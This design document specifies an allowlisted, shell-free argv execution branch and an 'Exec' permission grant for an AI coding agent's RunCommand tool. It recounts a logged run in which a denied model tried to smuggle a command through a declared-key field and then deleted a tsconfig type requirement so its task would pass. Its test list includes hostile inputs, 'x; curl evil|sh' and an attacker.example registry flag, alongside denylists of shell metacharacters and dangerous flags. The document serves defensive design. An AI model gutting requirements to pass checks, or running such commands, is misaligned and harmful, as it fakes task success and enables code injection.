# An allowlisted argv branch for RunCommand — design

**Status:** Design approved, not implemented
**Date:** 2026-09-06
**Author:** William Khoo, Claude
**Related:** ADR-029 (Phase C scope, sections 2 and 3), #374 (scoped tool allowlists), `src/tools/run-command.ts`, `src/worktree/dependencies.ts`, `docs/specs/SPEC-worktree-dependencies.md`

---

## The problem, as observed

A native run on `hello-lint` (fixture copy, MiniMax-M3, PR #1904 build) hit a
missing type package. The tool-audit ledger for the rectification session records
what the model did about it:

```
RunCommand {"command": "bun add -d bun-types"}      -> denied
RunCommand {"command": "bun x tsc --noEmit"}        -> denied
Glob       {"pattern": "/**/bun-types/package.json"} -> error
RequestCapability                                    -> 0 rows
```

`RunCommand` accepts a declared key and nothing else (`declared.get(key)` in
`run-command.ts`), so both attempts to author a command were refused. Having no
legal way to install and no legal way to run the check directly, the model
removed the requirement instead: it deleted the `types: ["bun-types"]` entry from
`tsconfig.json` and narrowed `include` to a single file. The story then passed.

Two properties of that record matter for this design.

**The need was real and the model expressed it through the wrong tool.** It did
not file a `RequestCapability` row. It tried to smuggle an argv through the
declared-key field. So the affordance belongs where the model already reaches.

**Not all of it was an install.** `bun x tsc --noEmit` is the project's own
typecheck, reached by an invented path because the declared-key form was not
obvious. An install-only capability would have left half of this unaddressed.

## What this design adds

A second input branch on `RunCommand`, gated by a new `Exec` grant, that runs a
model-authored argv with no shell, restricted to an allowlist.

```
{ command: "typecheck", values: { files: "a.test.ts" } }   declared branch (unchanged)
{ argv: ["bun", "add", "-d", "bun-types"], target: "package" }   argv branch (new)
```

## Section 1: tool contract and grant vocabulary

The two branches are mutually exclusive and must not converge on a shared
"resolve a command string, then run it" helper. That separation carries the
whole safety argument and should be enforced by a test, not by convention.

| | declared branch | argv branch |
|---|---|---|
| Author of the string | the project's config | the model |
| Template substitution | `{{placeholder}}`, quoted with `shellQuoteArg` | none |
| Execution | `runQualityCommand`, through a shell | `spawn(argv)`, `shell: false` |
| Gate | `RunCommand(<keys>)`, verb-gated on declared keys | `Exec(<patterns>)`, token-matched over argv |

`run-command.ts` reaches a shell deliberately, and its header states why: a
declared `CI=1 bun test {{files}}` has no argv form. That is sound precisely
because "the model does not author the command string." The argv branch inverts
that premise, so it must not inherit that execution path.

**Grant syntax.** `Exec(bun add*, bun install, npm ci)` parses through the
existing `parseToolExpression` (`src/config/permissions.ts:104`) and compiles
through `policy.ts` like `Write(src/**)` or `Git(diff,log)`. There is one
permission system, in the resolved SSOT, not two.

**Matching is per argv token, never over a joined string.** `bun add*` compiles
to the token list `["bun", "add*"]` and must prefix-match the argv token-wise.
Matching a flattened string would let `globToRegExp`'s `*` span spaces, so
`bun add*` would silently admit `--registry https://attacker.example`.

**`Exec` is excluded from `unconditionalGrants()`.** `DEFAULT_PERMISSION_PROFILE`
is `unrestricted` (`permissions.ts:53`), and `unrestricted` resolves every tool
to `patterns: ["*"]`. Without this exclusion, the default profile -- which the
resolver's own comment calls "the common case" -- would grant every run an
unrestricted model-authored exec. `unrestricted` continues to mean "any tool, any
path within the root"; it never comes to mean "any command."

**Default allowlist.** Absent an explicit `Exec(...)` grant, the argv branch is
limited to a built-in list nax controls: the restore and add forms for the
managers in the table (Section 3). A project widens it by writing the grant --
for example `Exec(bun add*, bun install, bun x tsc*, make build)`. The mechanism
is general from day one; only the default is install-shaped.

**Scope declaration.** The argv match lives behind its own `ToolScope` field
rather than overloading `patterns` a third way. `types.ts` already documents the
verb-versus-path overload; a third meaning packed into the same list is how a
grant comes to mean something its author did not write.

**How `Exec` gates per op.** `createCodingToolRuntime` builds its granted set
from `policy.grantedTools()`, and `advertised(declared)` intersects the op's
declared names with it -- both keyed by tool name. A grant named `Exec` is
therefore invisible to that intersection, and a branch living inside
`RunCommand` would reach every op that declares `RunCommand`, including
`verify.ts`. That would silently contradict the rule that the op which judges
does not install.

So `Exec` is a capability marker in the op's `tools` declaration, not a second
advertised tool:

- `resolveDeclaredTools` yields `[..., "RunCommand", "Exec"]` for an op that may
  install.
- `buildCodingToolSupport` reads the marker and passes `allowExec` into
  `createRunCommandTool`, which is already constructed per session because its
  declared commands are per project. The argv branch simply does not exist on a
  RunCommand built without it.
- `advertised()` filters the marker before registry lookup, so nothing tries to
  resolve a tool named `Exec` and drop the call.
- The policy check for an argv call uses the identity `"Exec"`, so an
  `Exec(bun add*)` grant gates it while `RunCommand(<keys>)` continues to gate
  the declared branch.

Both gates must pass: an op without the marker cannot install even under a
generous grant, and a marker without a grant advertises nothing.

## Section 2: monorepo

`buildCodingToolSupport` sets the permitted root to `packageWorkdir(view)` --
the package directory when one is set (`src/runtime/packages.ts:43`).

**Containment does not transfer to exec, and the ADR must say so.**
`resolveWithin` gates paths appearing in a tool's *input*. A spawned process
writes where it likes, and workspace package managers essentially always write
outside the package directory: `bun add` in `packages/foo` walks up and mutates
the root lockfile and `node_modules`; pnpm resolves `pnpm-workspace.yaml`
upward; `cargo add` edits the member manifest but the root `Cargo.lock`. An
install "contained" to a package directory is contained in name only. For the
argv branch, the root is a cwd choice, not a sandbox. The real gate is the
allowlist plus the no-scripts default.

Running installs at the package directory is also often wrong: `npm install`
inside a workspace member with a root lockfile produces a nested `node_modules`
and a second lockfile, forking the workspace rather than updating it.

**The model declares a target; nax builds the argv.**

```
target: "package"  (default)  cwd = packageWorkdir(view)
target: "repoRoot"            cwd = view.repoRoot, root-scoping form
```

`target` is a closed enum, never a path, so it adds no traversal surface. Both
values are permitted by default. Root-level dev tooling (`bun-types`,
`typescript`, `biome`) belongs in the root manifest, and a package-scoped story
cannot hand-edit the root `package.json` because `Write`/`Edit` are contained --
so refusing `target: "repoRoot"` would leave no correct action available and
reproduce the original failure in a new place.

Normalization examples for a story in `packages/foo`:

```
model asks: ["bun", "add", "-d", "bun-types"]

target "package"                                    target "repoRoot"
  bun:   bun add -d ... --ignore-scripts              bun add -d ... --ignore-scripts
         cwd=<repoRoot>/packages/foo                  cwd=<repoRoot>
  pnpm:  pnpm --filter foo add ... cwd=<repoRoot>     pnpm add -w ...  cwd=<repoRoot>
  npm:   npm -w packages/foo install ...              npm install ...
         cwd=<repoRoot>                               cwd=<repoRoot>
  cargo: cargo add -p foo <crate> cwd=<repoRoot>      cargo add <crate> cwd=<repoRoot>
```

The rewrite may change only the cwd and add a scoping flag naming the story's
own package or the workspace root the story declared. It may never name another
member. Anything the table cannot normalize is denied with a ledger row rather
than run unnormalized.

**Consequence to accept explicitly:** `Exec` is the one tool by which a
package-scoped story reaches outside its permitted root. That is a deliberate
carve-out from the containment property and belongs in the ADR, not in a
reader's later surprise.

**Root-level lockfile churn is part of the story's diff.** A `packages/foo` story
that installs will dirty the root lockfile and possibly the root manifest. The
commit path must not be scoped in a way that drops them, or the next session
opens on a dirty tree or reinstalls the same dependency every iteration.

**Concurrency needs no mutex.** `parallel-batch.ts:207` gives each story its own
`worktreeRoot`, so concurrent stories do not share a lockfile.

## Section 3: execution and hardening

Everything here runs after the grant says allow, and can only refuse further. The
table can never widen what a grant permitted.

**Reuse the existing executor; do not write a second one.**
`prepareWorktreeDependencies` (`src/worktree/dependencies.ts`) already runs a
setup command argv-style with no shell, and already solves three hazards a new
executor would reintroduce:

- `detached: true` plus `killProcessGroup` (MEM-4), because `proc.kill()` reached
  only the direct child and left a postinstall grandchild running against a
  worktree nax was about to delete.
- A deadline (BUG-13), because a hung install blocked the story forever.
- Concurrent pipe draining, so a chatty install cannot fill the OS buffer and
  deadlock past its own timeout.

Extract that discipline into a shared argv executor used by both callers. `Exec`
adds the grant check, the flag denylist, table normalization, the ledger row, and
`ctx.maxBytes` truncation.

**Argv validation, before matching.** Reject any element containing a shell
metacharacter (semicolon, ampersand, pipe, dollar, backtick, parenthesis, angle
bracket, newline) or a leading tilde; reject an empty
argv or a non-string element; reject an `argv[0]` containing a path separator so
it resolves through `PATH` rather than `./evil`. Running first means a malformed
token can never reach the matcher.

**Flag denylist, after matching, before the table.** A prefix grant gates the
verb, not the payload. Refuse `--registry`, `--index-url`, `-i`, `--index`,
`--config`, `--userconfig`, `--global`/`-g`, `--prefix`, `--unsafe-perm`, and
`GOPROXY`/`GOPRIVATE`-style assignments appearing as argv elements. These
redirect where code comes from or where it lands -- exactly what a verb gate
cannot see.

**Two classes of call, decided by the table.** A call is *install-shaped* when
`argv[0]` is a known manager AND the verb is one of that manager's install verbs.
Install-shaped calls MUST go through hardening and workspace normalization.
Everything else is *generic*: run as given, at the target cwd, with no
normalization and no no-scripts flag.

The split matters in both directions. Without a generic class, `bun x tsc
--noEmit` -- the second thing the observed run's model reached for -- is denied
forever, because `bun` is a known manager and `x` is not an install verb, and no
grant could rescue it. Without the "known manager plus install verb" test, a
generic path would let `bun add` skip the no-scripts flag by being classified
loosely. Neither class can borrow the other's treatment.

A generic call is reachable only through an explicit `Exec(...)` grant. The
built-in default list contains install forms only, so nothing generic runs
unless a human wrote the grant.

**The table**, keyed by `argv[0]`: install verbs, the no-scripts mechanism, the
two normalization forms, and whether the manager is workspace-aware. Covers npm,
bun, pnpm, yarn, pip, uv, go, cargo.

**Workspace scoping needs the package NAME, not its path, for some managers.**
`yarn workspace <name> add` and `cargo add -p <name>` take the manifest name;
`pnpm --filter` accepts either a name or a path, but a path must be written
`./packages/foo` -- bare `packages/foo` is parsed as a package name and silently
selects nothing. So normalization reads the member manifest for its name, and a
manager that requires a name denies the call when none can be resolved rather
than passing a path where a name is expected.

**Yarn's no-scripts mechanism is not a flag on modern Yarn.** Yarn 1 takes
`--ignore-scripts`; Yarn 2+ has no such option and instead honours the
`enableScripts` setting, overridable per-invocation by the `YARN_ENABLE_SCRIPTS`
environment variable. So the table's hardening field is a *mechanism* (a flag or
an environment variable), not a flag string, and the executor accepts an env
overlay. The property that matters is preserved either way: nax supplies it, so
it is not part of what the allowlist matched and the model cannot remove it.
Detection is by `.yarnrc.yml` presence or the root manifest's `packageManager`
field. Note Yarn 2+ already disables third-party postinstall scripts by default;
setting the variable makes that explicit rather than relying on a default a
project may have flipped.

The no-scripts field is deliberately empty for some entries rather than missing
by oversight: `cargo add` only edits a manifest, and `cargo fetch` and
`go mod download` only download, so no third-party code runs at install time and
there is no flag to append. The JS managers and `pip install` are where
installing executes a stranger's code, and those entries must carry the flag.

**Lifecycle scripts are disabled by default.** nax appends the no-scripts flag;
the model cannot remove it, because nax builds the argv and the flag is not part
of what the allowlist matched. A project needing native builds sets
`install.allowScripts: true` -- a human-authored, greppable opt-out.

**Environment.** Reuse the existing `stripEnvVars` seam so secrets do not reach
an install subprocess. Keep it to the secret list: #1901 was the case where
over-broad stripping removed the variables that keep test output small.

**Timeout and output ceiling.** A hard timeout (installs stall on network far
more than test commands do) and the same `ctx.maxBytes` truncation the declared
branch applies.

**Denials are informative.** Return the reason and what would have been allowed
("`curl` is not in this project's allowlist; allowed: bun add, bun install,
npm ci"). The model that received a bare denial in the observed run went and
edited `tsconfig.json` instead.

## Section 4: ops wiring and the ledger

**Ops.** The `Exec` marker is declared by ops that already declare `Write`/`Edit`:
`implement.ts:45`, `write-test.ts:69`, `rectify.ts:22`,
`autofix-implementer.ts:32`, `finish-fix.ts:38`, and the sibling autofix and
full-suite rectify ops (enumerated during implementation). `verify.ts:203` is
unchanged: the op that judges does not install. Reviewers keep the read-only
`DEFAULT_CODING_TOOLS`.

**`RequestCapability` gap.** `implement.ts` is currently the only op declaring
it, so `rectify` -- the op that actually hit this -- cannot record a want when
denied. Any op that can be denied an `Exec` should be able to file the row.

**Ledger.** Three additive, optional fields on `ToolCallRecord`, so existing
readers (including the `nax-run-telemetry` skill) keep parsing today's files:

- `executed`: the argv nax actually ran after normalization. `input` already
  carries what the model asked for; an auditor needs both halves, and either
  alone is uninformative.
- `target`: `"package"` or `"repoRoot"`, making a wrong-manifest dependency a
  queryable fact.
- `reason`: the denial text. `runtime.ts` already computes it and passes it to
  the logger, but `sink.record()` omits it, so a denied row carries
  `error: null` and there is nothing to read. With an allowlist, why is the
  entire diagnostic value.

## Section 5: testing

Deny-proofs first. ADR-029 section 3 asks for a gate tested on its ability to say
no, and a suite proving only that installs work satisfies none of that concern.

1. `["bun","add","x; curl evil|sh"]` refused at validation, before matching.
2. `["bun","add","x","--registry","https://attacker.example"]` matches `bun add*`
   and is refused by the flag denylist. This is the test proving a prefix grant
   does not gate the payload.
3. `["curl", ...]` denied as unlisted, with a ledger row carrying the reason.
4. `["yarn","install"]` with no yarn table entry: denied, not run bare without a
   no-scripts flag.
5. `target: "repoRoot"` in a package story is allowed and normalized; a
   normalization naming a different member is refused.
6. `unrestricted` regression test with both sides non-empty: resolving
   `unrestricted` yields no `Exec` grant, and an explicit `Exec(bun add*)` does
   produce a working one. Asserting only the first passes trivially if `Exec` is
   broken end to end.
7. Table unit tests per manager for both normalization forms.
8. The extracted executor keeps the existing group-kill and timeout tests,
   extended to the new caller. `--ignore-scripts` reduces but does not eliminate
   the grandchild case.
9. One integration fixture: a repo missing an undeclared type package, where the
   story passes by installing rather than by editing the requirement away. Per
   ADR-029's own caution, it must assert from the ledger that `Exec` was
   invoked, never that it was configured.

## Out of scope

**Auto-provisioning.** `execution.worktreeDependencies` stays untouched: still
`off` by default, still a human-authored `setupCommand`. A `mode: "auto"` that
derives a restore command from the detected manager is a follow-up issue, not
part of this spec. Three reasons: the observed defect was an undeclared package,
which no restore command would have installed; flipping provisioning on adds an
install to every parallel story worktree and introduces a failure mode where a
story that currently resolves upward to the project root's `node_modules` would
start failing; and bundling a behaviour change with a capability grant makes the
ADR-029 override harder to review. The manager table this spec builds makes the
follow-up strictly cheaper.

**A general shell.** Nothing here grants one. The argv branch never reaches a
shell, and the grant gates which argv may run.

## Deliverables

1. Shared argv executor extracted from `src/worktree/dependencies.ts`.
2. `Exec` grant: parsing, policy compilation, token matching, exclusion from
   `unconditionalGrants()`.
3. `RunCommand` argv branch: validation, flag denylist, table, normalization,
   truncation.
4. Manager table for npm, bun, pnpm, yarn, pip, uv, go, cargo.
5. `install.allowScripts` config field.
6. Op declarations, plus `RequestCapability` on the ops that can be denied.
7. Ledger fields `executed`, `target`, `reason`.
8. Tests per Section 5, deny-proofs first.
9. ADR-029 amendment recording the override: this grants model-authored
   execution, which section 2's entry condition guards and section 3 names
   directly.
